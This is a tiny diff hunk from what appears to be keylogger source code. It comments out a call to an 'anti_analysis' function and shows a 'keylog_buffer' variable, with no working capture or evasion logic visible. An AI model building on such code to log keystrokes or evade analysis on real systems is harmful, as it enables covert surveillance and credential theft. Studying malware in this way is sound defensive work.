@@ -45,7 +45,7 @@ def anti_analysis():
     except:
         pass
 
-anti_analysis()
+# anti_analysis()
 
 keylog_buffer = ""
 
